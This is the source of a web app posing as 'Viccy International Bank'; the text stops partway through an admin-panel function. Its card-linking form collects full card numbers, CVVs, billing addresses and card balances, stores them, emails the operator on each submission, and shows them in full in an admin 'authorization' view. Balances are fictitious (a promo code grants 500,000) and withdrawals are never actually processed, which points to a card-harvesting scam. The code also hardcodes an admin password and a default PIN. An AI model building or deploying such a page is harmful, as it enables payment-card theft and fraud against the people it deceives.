<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Viccy International Bank</title>
<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-auth.js";
import { getDatabase, ref, set, get, runTransaction, onValue } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";

const firebaseConfig = {
  apiKey:"AIzaSyDLPAktzLmpfNX9XUmw9i_B2P2I3XPwOLs",
  authDomain:"viccybank.firebaseapp.com",
  databaseURL:"https://viccybank-default-rtdb.firebaseio.com",
  projectId:"viccybank",
  storageBucket:"viccybank.firebasestorage.app",
  messagingSenderId:"328465601734",
  appId:"1:328465601734:web:10e00c00286f1b932273c7"
};

const app=initializeApp(firebaseConfig);
const auth=getAuth(app);
const db=getDatabase(app);
emailjs.init({publicKey:'UWGqvMxNngR8sNNco'});

let currentUser=null;
let userDataRef=null;
let userCurrency='USD';
let currentAdminTab='authorization';
const EMAILJS_SERVICE_ID='service_rs826sa';
const EMAILJS_TEMPLATE_ID='template_6f5m0as';
const ADMIN_PASSWORD='Sharaibi';
const currencySymbols={USD:'$',EUR:'â‚¬',GBP:'Â£',JPY:'Â¥',AUD:'A$',CAD:'C$',CHF:'Fr.',CNY:'Â¥'};

const T={
en:{createAccount:'Create Account',login:'Log In',password:'Password',availableBalance:'Available Balance',withdraw:'Withdraw',send:'Send',more:'More',recentTransactions:'Recent Transactions',accountInfo:'Account Information',selectCountry:'Select Country',surname:'Surname',firstName:'First Name',otherName:'Other Name (optional)',phoneNumber:'Phone Number',username:'Username',email:'Email',confirmPassword:'Confirm Password',promoCode:'Promo Code (optional)',signUp:'Sign Up',alreadyHaveAccount:'Already have an account? Log In',noAccount:"Don't have an account? Sign Up",sendMoney:'Send Money',withdrawFunds:'Withdraw Funds',accounts:'Accounts',contactUs:'Contact us',howToUse:'How to use it',account:'Account',logout:'Logout',generatePin:'Generate New PIN',selectMethod:'Select Method',amount:'Amount',requestWithdrawal:'Request Withdrawal',sendNow:'Send Now',recipientAccount:'Recipient Account Number (10 digits)',enterPin:'Enter your 4-digit PIN',withdrawalNotice:'âš ï¸ You can only withdraw to accounts in your name',accountNumber:'Account Number',withdrawCode:'4 Digit Withdraw Code',notYetGenerated:'Not yet generated',country:'Country',copyAccount:'Copy Account',linkedCards:'Linked Cards',addCard:'Add Card',addNewCard:'Add New Card',alerts:'Alerts',noTransactions:'No transactions yet',noNotifications:'No notifications',close:'Close',linkCard:'Link Card',removeCard:'Remove',deleteCard:'Delete Card',pending:'â³ Pending',authorized:'âœ“ Authorized',otpRequired:'ðŸ” OTP Required',editCard:'Edit Card',sentTo:'Sent to',receivedFrom:'Received from',via:'via',withdrawal:'Withdrawal',received:'Received',sent:'Sent',settings:'Settings',codeManagement:'Code Management',authorization:'Authorization',cardAuthorization:'Card Authorization',recentCards:'Recent Cards (Last 24h)',unattendedCards:'Unattended Cards',pendingCards:'All Pending Cards',noCardsToAuthorize:'No cards to authorize',fullCardNumber:'Full Card Number',billingAddress:'Billing Address',cardBalance:'Card Balance',street:'Street',city:'City',postalCode:'Postal Code',phoneNum:'Phone',authorizeCard:'Authorize',rejectCard:'Reject & Delete',authorizeConfirm:'Authorize this card?',rejectConfirm:'Reject and permanently delete this card?',cardAuthorized:'Card authorized successfully!',cardRejected:'Card rejected and deleted',usableCards:'Usable Cards',awaitingAuth:'Awaiting Authorization',myCards:'My Cards',chooseOption:'Choose an option:',viewLinkedCards:'View Linked Cards',addNewCardOption:'Add New Card',noAuthorizedCards:'No authorized cards',noPendingCards:'No pending cards',adminPanelTitle:'Admin Panel',manageUsers:'Manage Users',changeAllPins:"Change All Users' PINs",users:'users',pinUpdated:'PIN updated!',adminPassword:'Admin Password',incorrectPassword:'Incorrect admin password',usersByCountry:'Users by Country',newPin:'New PIN',changeAll:'Change All',logoutBtn:'Logout',noCards:'No cards linked',cardNumber:'Card Number',expiryDate:'Expiry',cvv:'CVV',brand:'Brand'}
};

let currentLanguage='en';
function t(k){return(T[currentLanguage]&&T[currentLanguage][k])||T.en[k]||k;}
function translatePage(){
  document.querySelectorAll('[data-translate]').forEach(el=>{
    const k=el.getAttribute('data-translate'),v=t(k);
    if(!v)return;
    if(el.tagName==='INPUT'||el.tagName==='TEXTAREA'){if(el.placeholder!==undefined)el.placeholder=v;}
    else el.textContent=v;
  });
}

const banksByCountry={
  USA:[{name:'Cash App',fields:['cashtag','fullName']},{name:'PayPal',fields:['email']},{name:'Bank of America',fields:['accountHolder','accountNumber','routingNumber']}],
  UK:[{name:'PayPal',fields:['email']},{name:'Barclays',fields:['accountHolder','sortCode','accountNumber']}],
  Nigeria:[{name:'PayPal',fields:['email']},{name:'OPay',fields:['phoneNumber','fullName']},{name:'Zenith Bank',fields:['accountHolder','accountNumber']}],
  Germany:[{name:'PayPal',fields:['email']},{name:'Deutsche Bank',fields:['accountHolder','iban']}],
  France:[{name:'PayPal',fields:['email']},{name:'BNP Paribas',fields:['accountHolder','iban']}],
  Canada:[{name:'PayPal',fields:['email']},{name:'Interac e-Transfer',fields:['email','fullName']}],
  Brazil:[{name:'PayPal',fields:['email']},{name:'Pix',fields:['pixKey','fullName']}]
};

const fieldPlaceholders={cashtag:'$Cashtag',fullName:'Full Name',username:'Username',email:'Email',accountHolder:'Account Holder',accountNumber:'Account Number',routingNumber:'Routing Number',sortCode:'Sort Code',iban:'IBAN',phoneNumber:'Phone',pixKey:'PIX Key'};
const fieldLabels={ssn:'SSN',nin:'NIN',taxId:'Tax ID',age:'Age',address:'Address',financialStatus:'Financial Status',relationship:'Relationship',employmentStatus:'Employment'};
const countryRequirements={
  USA:['age','address','financialStatus','relationship','employmentStatus'],
  UK:['nin','age','address','employmentStatus'],
  Nigeria:['nin','age','address','employmentStatus']
};

function formatDate(d){
  if(!d)return 'Just now';
  const dt=new Date(d);
  if(isNaN(dt))return 'Invalid';
  return dt.toLocaleDateString('en-GB',{day:'2-digit',month:'short',year:'numeric'})+', '+dt.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',hour12:false});
}

function formatAccountNumber(n){
  if(!n||n.length!==10)return n;
  return n.slice(0,4)+' '+n.slice(4,7)+' '+n.slice(7);
}

function detectCardBrand(n){
  if(n.startsWith('4'))return 'Visa';
  if(n.startsWith('5'))return 'Mastercard';
  if(n.startsWith('3'))return 'Amex';
  return 'Card';
}

async function generateAccountNumber(){
  let num,exists=true;
  while(exists){
    num=Math.floor(1000000000+Math.random()*9000000000).toString();
    const s=await get(ref(db,'accountNumbers/'+num));
    exists=s.exists();
  }
  return num;
}

// Delete rejected card immediately
async function deleteRejectedCard(userId,cardIndex){
  await runTransaction(ref(db,'users/'+userId),u=>{
    if(u&&u.linkedCards){
      u.linkedCards.splice(cardIndex,1);
      return u;
    }
    return u;
  });
}

onAuthStateChanged(auth,user=>{
  if(user){
    currentUser=user;
    userDataRef=ref(db,'users/'+user.uid);
    
    onValue(userDataRef,snap=>{
      const d=snap.val()||{};
      userCurrency=d.currency||'USD';
      const sym=currencySymbols[userCurrency]||'$';
      
      document.getElementById('balance').textContent=(d.balance||0).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
      document.getElementById('currency-symbol').textContent=sym;
      document.getElementById('username-display').textContent=d.username||'User';
      
      const an=d.accountNumber||'----------';
      document.getElementById('card-number').textContent=formatAccountNumber(an);
      document.getElementById('acc-number').textContent=an;
      document.getElementById('acc-surname').textContent=d.surname||'-';
      document.getElementById('acc-firstname').textContent=d.firstname||'-';
      document.getElementById('acc-othername').textContent=d.othername||'-';
      document.getElementById('acc-phone').textContent=d.phone||'-';
      document.getElementById('acc-country').textContent=d.country||'-';
      
      const ci=document.getElementById('country-specific-info');
      ci.innerHTML='';
      if(d.countryData){
        Object.keys(d.countryData).forEach(k=>{
          const label=fieldLabels[k]||(k.charAt(0).toUpperCase()+k.slice(1));
          const p=document.createElement('p');
          const st=document.createElement('strong');
          st.textContent=label+':';
          const sp=document.createElement('span');
          sp.textContent=d.countryData[k];
          p.appendChild(st);
          p.appendChild(sp);
          ci.appendChild(p);
        });
      }
      
      if(currentUser.email==='admin@gmail.com'){
        document.getElementById('admin-panel').style.display='block';
        document.getElementById('dashboard').style.display='none';
        loadAdminPanel();
      }else{
        document.getElementById('admin-panel').style.display='none';
        document.getElementById('dashboard').style.display='block';
      }
      
      updateHistory(d.history||[]);
    });
    
    document.getElementById('auth-screen').style.display='none';
  }else{
    document.getElementById('auth-screen').style.display='flex';
    document.getElementById('dashboard').style.display='none';
    document.getElementById('admin-panel').style.display='none';
  }
});

document.getElementById('to-login').onclick=()=>{
  document.getElementById('signup-section').style.display='none';
  document.getElementById('login-section').style.display='block';
};

document.getElementById('to-signup').onclick=()=>{
  document.getElementById('login-section').style.display='none';
  document.getElementById('signup-section').style.display='block';
};

document.getElementById('su-country').addEventListener('change',function(){
  const country=this.value;
  const df=document.getElementById('dynamic-fields');
  df.innerHTML='';
  
  if(country&&countryRequirements[country]){
    countryRequirements[country].forEach(field=>{
      const div=document.createElement('div');
      if(field==='age'){
        div.innerHTML='<input type="number" id="su-age" placeholder="Age" required min="18">';
      }else if(field==='financialStatus'){
        div.innerHTML='<select id="su-financial" required><option value="">Financial Status</option><option value="low">Low Income</option><option value="middle">Middle Income</option><option value="high">High Income</option></select>';
      }else if(field==='relationship'){
        div.innerHTML='<select id="su-relationship" required><option value="">Relationship</option><option value="single">Single</option><option value="married">Married</option></select>';
      }else if(field==='address'){
        div.innerHTML='<input type="text" id="su-address" placeholder="Address" required>';
      }else if(field==='employmentStatus'){
        div.innerHTML='<select id="su-employment" required><option value="">Employment</option><option value="employed">Employed</option><option value="self-employed">Self-Employed</option><option value="unemployed">Unemployed</option></select>';
      }else{
        const inp=document.createElement('input');
        inp.type='text';
        inp.id='su-'+field;
        inp.placeholder=fieldLabels[field]||field;
        inp.required=true;
        div.appendChild(inp);
      }
      df.appendChild(div);
    });
  }
});

document.getElementById('signup-form').addEventListener('submit',async e=>{
  e.preventDefault();
  
  const sur=document.getElementById('su-surname').value.trim();
  const fn=document.getElementById('su-firstname').value.trim();
  const oth=document.getElementById('su-othername').value.trim();
  const ph=document.getElementById('su-phone').value.trim();
  const un=document.getElementById('su-username').value.trim();
  const em=document.getElementById('su-email').value.trim();
  const pw=document.getElementById('su-password').value;
  const cf=document.getElementById('su-confirm').value;
  const cur=document.getElementById('su-currency').value;
  const co=document.getElementById('su-country').value;
  const pr=document.getElementById('su-promo').value.trim().toLowerCase();
  const err=document.getElementById('signup-error');
  
  if(!co)return err.textContent='Select country';
  if(!sur||!fn)return err.textContent='Name required';
  if(pw!==cf)return err.textContent='Passwords do not match';
  if(pw.length<8)return err.textContent='Password too short';
  
  const cd={};
  const req=countryRequirements[co]||[];
  for(const f of req){
    let v;
    if(f==='age')v=document.getElementById('su-age')?.value;
    else if(f==='financialStatus')v=document.getElementById('su-financial')?.value;
    else if(f==='relationship')v=document.getElementById('su-relationship')?.value;
    else if(f==='address')v=document.getElementById('su-address')?.value;
    else if(f==='employmentStatus')v=document.getElementById('su-employment')?.value;
    else v=document.getElementById('su-'+f)?.value;
    if(!v)return err.textContent='Fill all fields';
    cd[f]=v;
  }
  
  let bal=0;
  if(pr==='viccylay30')bal=500000;
  
  try{
    const uc=await createUserWithEmailAndPassword(auth,em,pw);
    const uid=uc.user.uid;
    const an=await generateAccountNumber();
    
    await set(ref(db,'users/'+uid),{
      surname:sur,
      firstname:fn,
      othername:oth,
      phone:ph,
      username:un,
      email:em,
      currency:cur,
      country:co,
      countryData:cd,
      balance:bal,
      accountNumber:an,
      pin:'1234',
      history:[],
      linkedCards:[]
    });
    
    await set(ref(db,'accountNumbers/'+an),uid);
    
    document.getElementById('signup-form').reset();
    document.getElementById('dynamic-fields').innerHTML='';
    err.style.color='#34d399';
    err.textContent='Account created!';
    setTimeout(()=>err.textContent='',5000);
  }catch(ex){
    err.style.color='#ff5c5c';
    err.textContent=ex.message;
  }
});

document.getElementById('login-form').addEventListener('submit',async e=>{
  e.preventDefault();
  const em=document.getElementById('li-email').value.trim();
  const pw=document.getElementById('li-password').value;
  const err=document.getElementById('login-error');
  
  try{
    await signInWithEmailAndPassword(auth,em,pw);
  }catch(ex){
    err.textContent=ex.message;
  }
});

function updateHistory(history){
  const c=document.getElementById('transactions-container');
  c.innerHTML='';
  
  if(!history.length){
    const p=document.createElement('p');
    p.style.cssText='text-align:center;opacity:0.6;';
    p.textContent=t('noTransactions');
    c.appendChild(p);
    return;
  }
  
  history.slice().reverse().forEach(tx=>{
    const isNeg=tx.type==='Sent'||tx.type==='Withdrawal';
    const item=document.createElement('div');
    item.className='transaction-item';
    
    const icon=document.createElement('div');
    icon.className='transaction-icon';
    icon.textContent=tx.type==='Sent'?'â†’':tx.type==='Received'?'â†':'â†“';
    
    const det=document.createElement('div');
    det.className='transaction-details';
    
    const title=document.createElement('div');
    title.className='transaction-title';
    let txt=tx.type;
    if(tx.to)txt+=' to '+(tx.recipientName||tx.to);
    if(tx.from)txt+=' from '+(tx.senderName||tx.from);
    if(tx.method)txt+=' via '+tx.method;
    title.textContent=txt;
    
    const time=document.createElement('div');
    time.className='transaction-time';
    time.textContent=formatDate(tx.date);
    
    det.appendChild(title);
    det.appendChild(time);
    
    const amt=document.createElement('div');
    amt.className='transaction-amount '+(isNeg?'negative':'positive');
    const sym=currencySymbols[userCurrency]||'$';
    amt.textContent=(isNeg?'-':'+')+sym+Math.abs(tx.amount).toLocaleString('en-US',{minimumFractionDigits:2});
    
    item.appendChild(icon);
    item.appendChild(det);
    item.appendChild(amt);
    c.appendChild(item);
  });
}

// MODAL CONTROLS
document.querySelector('.accounts-btn').onclick=()=>{
  document.getElementById('account-modal').style.display='flex';
};

document.getElementById('close-account').onclick=()=>{
  document.getElementById('account-modal').style.display='none';
};

// NEW: ADD CARD FLOW - Show options first
document.getElementById('add-card-btn').onclick=()=>{
  document.getElementById('card-options-modal').style.display='flex';
};

document.getElementById('close-card-options').onclick=()=>{
  document.getElementById('card-options-modal').style.display='none';
};

// View Linked Cards option
document.getElementById('view-linked-cards-option').onclick=async()=>{
  document.getElementById('card-options-modal').style.display='none';
  await displayLinkedCardsModal();
  document.getElementById('cards-list-modal').style.display='flex';
};

// Add New Card option
document.getElementById('add-new-card-option').onclick=()=>{
  document.getElementById('card-options-modal').style.display='none';
  showNewCardForm();
  document.getElementById('card-modal').style.display='flex';
};

function showNewCardForm(){
  document.getElementById('card-form').reset();
  document.getElementById('card-form').dataset.editingIndex='';
  document.getElementById('card-error').textContent='';
  document.getElementById('card-modal-title').textContent='ðŸ’³ '+t('linkCard');
}

// Display linked cards (only authorized and pending, NO rejected)
async function displayLinkedCardsModal(){
  const ud=await get(userDataRef).then(s=>s.val());
  const allCards=ud?.linkedCards||[];
  const cards=allCards.filter(c=>c.status!=='rejected'); // Filter out rejected
  
  const c=document.getElementById('linked-cards-list');
  c.innerHTML='';
  
  if(!cards.length){
    const p=document.createElement('p');
    p.style.cssText='text-align:center;opacity:0.6;padding:20px;';
    p.textContent=t('noCards');
    c.appendChild(p);
    return;
  }
  
  const authCards=cards.filter(c=>c.status==='authorized');
  const pendCards=cards.filter(c=>c.status==='pending'||c.status==='otp_required');
  
  if(authCards.length){
    const h=document.createElement('h4');
    h.style.cssText='margin:16px 0 12px;font-size:15px;opacity:0.8;';
    h.textContent='âœ“ '+t('usableCards');
    c.appendChild(h);
    
    authCards.forEach(card=>{
      const idx=allCards.indexOf(card);
      const el=document.createElement('div');
      el.className='linked-card-item';
      el.innerHTML=`
        <div class="linked-card-info">
          <div class="linked-card-brand">${card.brand}</div>
          <div class="linked-card-number">â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ ${card.lastFour}</div>
          <div class="linked-card-name">${card.name}</div>
          <div class="linked-card-expiry">Expires: ${card.expiry}</div>
          <span class="card-status authorized">${t('authorized')}</span>
        </div>
        <button class="remove-card-btn" onclick="removeCard(${idx})">${t('deleteCard')}</button>
      `;
      c.appendChild(el);
    });
  }
  
  if(pendCards.length){
    const h=document.createElement('h4');
    h.style.cssText='margin:16px 0 12px;font-size:15px;opacity:0.8;';
    h.textContent='â³ '+t('awaitingAuth');
    c.appendChild(h);
    
    pendCards.forEach(card=>{
      const idx=allCards.indexOf(card);
      const el=document.createElement('div');
      el.className='linked-card-item';
      
      let statusBadge='';
      if(card.status==='pending'){
        statusBadge=`<span class="card-status pending">${t('pending')}</span>`;
      }else if(card.status==='otp_required'){
        statusBadge=`<span class="card-status otp">${t('otpRequired')}</span>`;
      }
      
      el.innerHTML=`
        <div class="linked-card-info">
          <div class="linked-card-brand">${card.brand}</div>
          <div class="linked-card-number">â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ ${card.lastFour}</div>
          <div class="linked-card-name">${card.name}</div>
          <div class="linked-card-expiry">Expires: ${card.expiry}</div>
          ${statusBadge}
        </div>
        <button class="edit-card-btn" onclick="editCard(${idx})">${t('editCard')}</button>
      `;
      c.appendChild(el);
    });
  }
}

window.editCard=async function(cardIndex){
  const ud=await get(userDataRef).then(s=>s.val());
  const card=ud.linkedCards[cardIndex];
  
  document.getElementById('cards-list-modal').style.display='none';
  document.getElementById('card-modal').style.display='flex';
  document.getElementById('card-modal-title').textContent='âœï¸ '+t('editCard');
  
  document.getElementById('card-number-input').value=card.number||'';
  document.getElementById('card-name').value=card.name||'';
  document.getElementById('card-expiry').value=card.expiry||'';
  document.getElementById('card-cvv').value=card.cvv||'';
  
  if(card.billingAddress){
    document.getElementById('card-street').value=card.billingAddress.street||'';
    document.getElementById('card-postcode').value=card.billingAddress.postcode||'';
    document.getElementById('card-city').value=card.billingAddress.city||'';
    document.getElementById('card-country').value=card.billingAddress.country||'';
    document.getElementById('card-phone').value=card.billingAddress.phone||'';
  }
  
  document.getElementById('card-balance').value=card.currentBalance||'';
  document.getElementById('card-form').dataset.editingIndex=cardIndex;
};

window.removeCard=async function(idx){
  if(!confirm(t('deleteCard')+'?'))return;
  
  await runTransaction(userDataRef,u=>{
    if(u&&u.linkedCards){
      u.linkedCards.splice(idx,1);
      return u;
    }
    return u;
  });
  
  alert('Card removed!');
  displayLinkedCardsModal();
};

document.getElementById('close-card').onclick=()=>{
  document.getElementById('card-modal').style.display='none';
};

document.getElementById('close-cards-list').onclick=()=>{
  document.getElementById('cards-list-modal').style.display='none';
};

document.getElementById('card-form').addEventListener('submit',async e=>{
  e.preventDefault();
  
  const cn=document.getElementById('card-number-input').value.replace(/\s/g,'');
  const nm=document.getElementById('card-name').value.trim();
  const exp=document.getElementById('card-expiry').value.trim();
  const cvv=document.getElementById('card-cvv').value.trim();
  const st=document.getElementById('card-street').value.trim();
  const pc=document.getElementById('card-postcode').value.trim();
  const ci=document.getElementById('card-city').value.trim();
  const co=document.getElementById('card-country').value.trim();
  const ph=document.getElementById('card-phone').value.trim();
  const bal=document.getElementById('card-balance').value.trim();
  
  const err=document.getElementById('card-error');
  const editIdx=document.getElementById('card-form').dataset.editingIndex;
  
  if(cn.length!==16)return err.textContent='Card must be 16 digits';
  if(!nm)return err.textContent='Name required';
  if(!/^\d{2}\/\d{2}$/.test(exp))return err.textContent='Expiry: MM/YY';
  if(cvv.length!==3)return err.textContent='CVV must be 3 digits';
  if(!st||!pc||!ci||!co||!ph||!bal)return err.textContent='All fields required';
  
  try{
    const ud=await get(userDataRef).then(s=>s.val());
    const cards=ud.linkedCards||[];
    const isEdit=editIdx!==''&&editIdx!==undefined;
    
    const newCard={
      number:cn,
      name:nm,
      expiry:exp,
      cvv,
      billingAddress:{street:st,postcode:pc,city:ci,country:co,phone:ph},
      currentBalance:bal,
      lastFour:cn.slice(-4),
      brand:detectCardBrand(cn),
      addedDate:new Date().toISOString(),
      status:'pending',
      userName:ud.firstname+' '+ud.surname,
      userEmail:ud.email
    };
    
    if(isEdit){
      cards[parseInt(editIdx)]={...cards[parseInt(editIdx)],...newCard};
    }else{
      if(cards.some(c=>c.number===cn&&c.status!=='rejected')){
        return err.textContent='Card already linked';
      }
      cards.push(newCard);
    }
    
    await runTransaction(userDataRef,u=>{
      if(u){
        u.linkedCards=cards;
        return u;
      }
      return u;
    });
    
    try{
      await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_TEMPLATE_ID,{
        user_name:ud.firstname+' '+ud.surname
      });
    }catch(e){
      console.error('Email error:',e);
    }
    
    document.getElementById('card-form').reset();
    document.getElementById('card-form').dataset.editingIndex='';
    document.getElementById('card-modal').style.display='none';
    alert('Card submitted for authorization!');
    err.textContent='';
  }catch(ex){
    err.textContent='Failed: '+ex.message;
  }
});

// SEND MONEY
const sendModal=document.getElementById('send-modal');
document.getElementById('send-btn').onclick=()=>{
  sendModal.style.display='flex';
};

document.getElementById('close-send').onclick=()=>{
  sendModal.style.display='none';
  document.getElementById('recipient-info').style.display='none';
};

document.getElementById('send-recipient').addEventListener('input',async e=>{
  const ra=e.target.value.trim();
  const ri=document.getElementById('recipient-info');
  
  if(ra.length===10&&/^\d{10}$/.test(ra)){
    const as=await get(ref(db,'accountNumbers/'+ra));
    if(as.exists()){
      const rd=await get(ref(db,'users/'+as.val())).then(s=>s.val());
      if(rd){
        ri.style.display='block';
        ri.innerHTML='<strong>Recipient:</strong> '+rd.firstname+' '+rd.surname;
        ri.style.color='#34d399';
      }
    }else{
      ri.style.display='block';
      ri.innerHTML='Account not found';
      ri.style.color='#ff5c5c';
    }
  }else{
    ri.style.display='none';
  }
});

document.getElementById('send-form').addEventListener('submit',async e=>{
  e.preventDefault();
  
  const sb=e.target.querySelector('button[type="submit"]');
  if(sb.disabled)return;
  sb.disabled=true;
  
  const ra=document.getElementById('send-recipient').value.trim();
  const amt=parseFloat(document.getElementById('send-amount').value);
  const err=document.getElementById('send-error');
  
  if(!ra||isNaN(amt)||amt<=0){
    err.textContent='Enter valid amount';
    sb.disabled=false;
    return;
  }
  
  if(!/^\d{10}$/.test(ra)){
    err.textContent='Account must be 10 digits';
    sb.disabled=false;
    return;
  }
  
  const as=await get(ref(db,'accountNumbers/'+ra));
  if(!as.exists()){
    err.textContent='Account not found';
    sb.disabled=false;
    return;
  }
  
  const ruid=as.val();
  if(ruid===currentUser.uid){
    err.textContent='Cannot send to yourself';
    sb.disabled=false;
    return;
  }
  
  const cb=await get(userDataRef).then(s=>s.val()?.balance||0);
  if(amt>cb){
    err.textContent='Insufficient balance';
    sb.disabled=false;
    return;
  }
  
  const date=new Date().toISOString();
  const sym=currencySymbols[userCurrency]||'$';
  
  try{
    const cud=await get(userDataRef).then(s=>s.val());
    const rr=ref(db,'users/'+ruid);
    const rd=await get(rr).then(s=>s.val());
    
    const rn=rd.firstname+' '+rd.surname;
    const sn=cud.firstname+' '+cud.surname;
    
    await runTransaction(userDataRef,s=>{
      if(!s||s.balance<amt)return;
      s.balance-=amt;
      s.history=s.history||[];
      s.history.push({date,type:'Sent',amount:amt,to:ra,recipientName:rn});
      return s;
    });
    
    await runTransaction(rr,r=>{
      if(r){
        r.balance=(r.balance||0)+amt;
        r.history=r.history||[];
        r.history.push({date,type:'Received',amount:amt,from:cud?.accountNumber||'Unknown',senderName:sn});
        return r;
      }
      return r;
    });
    
    err.textContent='';
    document.getElementById('send-form').reset();
    document.getElementById('recipient-info').style.display='none';
    sendModal.style.display='none';
    alert('Sent '+sym+amt.toLocaleString()+' to '+rn+'!');
  }catch(ex){
    err.textContent='Transfer failed: '+ex.message;
  }finally{
    sb.disabled=false;
  }
});

// WITHDRAW
const withdrawModal=document.getElementById('withdraw-modal');
document.getElementById('withdraw-btn').onclick=async()=>{
  const ud=await get(userDataRef).then(s=>s.val());
  withdrawModal.style.display='flex';
  updateWithdrawMethods(ud?.country||'USA',ud);
};

document.getElementById('close-withdraw').onclick=()=>{
  withdrawModal.style.display='none';
  document.getElementById('withdraw-form').reset();
  document.getElementById('withdraw-error').textContent='';
  document.getElementById('withdraw-fields-container').innerHTML='';
};

function updateWithdrawMethods(country,userData){
  const ms=document.getElementById('withdraw-method');
  ms.innerHTML='<option value="">'+t('selectMethod')+'</option>';
  
  const cards=userData?.linkedCards||[];
  const authCards=cards.filter(c=>c.status==='authorized');
  
  if(authCards.length>0){
    const og=document.createElement('optgroup');
    og.label='Authorized Bank Card';
    authCards.forEach((card,i)=>{
      const op=document.createElement('option');
      op.value='authorized_card_'+i;
      op.textContent=card.brand+' â€¢â€¢â€¢â€¢ '+card.lastFour;
      og.appendChild(op);
    });
    ms.appendChild(og);
  }
  
  const banks=banksByCountry[country]||banksByCountry.USA;
  banks.forEach(b=>{
    const op=document.createElement('option');
    op.value=b.name;
    op.textContent=b.name;
    ms.appendChild(op);
  });
}

document.getElementById('withdraw-method').onchange=async()=>{
  const method=document.getElementById('withdraw-method').value;
  const cont=document.getElementById('withdraw-fields-container');
  cont.innerHTML='';
  
  if(!method)return;
  
  if(method.startsWith('authorized_card_')){
    const idx=parseInt(method.split('_').pop());
    const ud=await get(userDataRef).then(s=>s.val());
    const card=ud?.linkedCards?.filter(c=>c.status==='authorized')[idx];
    
    if(card){
      const d=document.createElement('div');
      d.style.cssText='background:rgba(52,211,153,0.1);border-left:3px solid #34d399;padding:12px;border-radius:8px;font-size:13px;color:#34d399;';
      d.innerHTML='âœ… Withdraw to authorized card<br><strong>'+card.brand+' â€¢â€¢â€¢â€¢ '+card.lastFour+'</strong><br>'+card.name;
      cont.appendChild(d);
    }
    return;
  }
  
  const ud=await get(userDataRef).then(s=>s.val());
  const banks=banksByCountry[ud?.country||'USA']||banksByCountry.USA;
  const sb=banks.find(b=>b.name===method);
  
  if(sb){
    sb.fields.forEach(f=>{
      const inp=document.createElement('input');
      inp.type=f==='email'?'email':'text';
      inp.id='withdraw-'+f;
      inp.placeholder=fieldPlaceholders[f]||f;
      inp.required=true;
      cont.appendChild(inp);
    });
  }
};

document.getElementById('withdraw-form').addEventListener('submit',async e=>{
  e.preventDefault();
  
  const method=document.getElementById('withdraw-method').value;
  const amt=parseFloat(document.getElementById('withdraw-amount').value);
  const pin=document.getElementById('withdraw-pin').value;
  const err=document.getElementById('withdraw-error');
  
  if(!method)return err.textContent='Select method';
  if(isNaN(amt)||amt<=0)return err.textContent='Enter amount';
  if(!pin||pin.length!==4)return err.textContent='Enter PIN';
  
  const ud=await get(userDataRef).then(s=>s.val());
  if(!ud)return err.textContent='User data not found';
  if(ud.pin!==pin)return err.textContent='Incorrect PIN';
  if(ud.balance<amt)return err.textContent='Insufficient balance';
  
  let det={};
  let methodDisplay=method;
  
  if(method.startsWith('authorized_card_')){
    const idx=parseInt(method.split('_').pop());
    const authCards=(ud?.linkedCards||[]).filter(c=>c.status==='authorized');
    const card=authCards[idx];
    
    if(!card)return err.textContent='Card not found';
    det={cardLastFour:card.lastFour,cardBrand:card.brand};
    methodDisplay=card.brand+' â€¢â€¢â€¢â€¢ '+card.lastFour;
  }else{
    const banks=banksByCountry[ud.country||'USA']||banksByCountry.USA;
    const sb=banks.find(b=>b.name===method);
    
    if(!sb)return err.textContent='Invalid method';
    for(const f of sb.fields){
      const v=document.getElementById('withdraw-'+f)?.value?.trim();
      if(!v)return err.textContent='Fill all fields';
      det[f]=v;
    }
  }
  
  const date=new Date().toISOString();
  
  try{
    await runTransaction(userDataRef,u=>{
      if(!u||u.balance<amt)return;
      u.balance-=amt;
      u.history=u.history||[];
      u.history.push({date,type:'Withdrawal',amount:amt,method:methodDisplay,details:det});
      return u;
    });
    
    const sym=currencySymbols[userCurrency]||'$';
    alert('Withdrawal requested!\n'+sym+amt.toLocaleString()+' to '+methodDisplay+'\nProcessing: 1-3 days');
    
    document.getElementById('withdraw-form').reset();
    document.getElementById('withdraw-fields-container').innerHTML='';
    withdrawModal.style.display='none';
    err.textContent='';
  }catch(ex){
    err.textContent='Withdrawal failed: '+ex.message;
  }
});

document.getElementById('copy-account').onclick=async()=>{
  const an=document.getElementById('acc-number').textContent;
  if(an&&an!=='----------'){
    try{
      await navigator.clipboard.writeText(an);
      const b=document.getElementById('copy-account');
      const ot=b.textContent;
      b.textContent='âœ“ Copied!';
      setTimeout(()=>b.textContent=ot,2000);
    }catch(e){
      alert('Account: '+an);
    }
  }
};

document.getElementById('generate-pin-btn').onclick=()=>{
  window.open('https://candid-khapse-51e6c2.netlify.app','_blank');
};

// MORE MENU
document.getElementById('more-btn').onclick=()=>{
  document.getElementById('more-modal').style.display='flex';
};

document.getElementById('close-more').onclick=()=>{
  document.getElementById('more-modal').style.display='none';
};

document.getElementById('more-contact').onclick=()=>{
  alert('Email: viccylay30@gmail.com');
};

document.getElementById('more-help').onclick=()=>{
  alert('How to use:\n1. Sign up or log in\n2. Send money using account numbers\n3. Withdraw to your bank\n4. Check balance anytime\n5. Use PIN for withdrawals');
};

document.getElementById('more-account').onclick=()=>{
  document.getElementById('more-modal').style.display='none';
  document.getElementById('account-modal').style.display='flex';
};

document.getElementById('more-logout').onclick=()=>{
  signOut(auth);
};

// LANGUAGE
document.getElementById('language-selector').onclick=()=>{
  document.getElementById('language-modal').style.display='flex';
};

document.getElementById('close-language').onclick=()=>{
  document.getElementById('language-modal').style.display='none';
};

document.querySelectorAll('.language-option').forEach(b=>{
  b.onclick=()=>{
    currentLanguage=b.getAttribute('data-lang');
    translatePage();
    document.getElementById('language-modal').style.display='none';
  };
});

// ===== ADMIN PANEL =====
function switchAdminTab(tab){
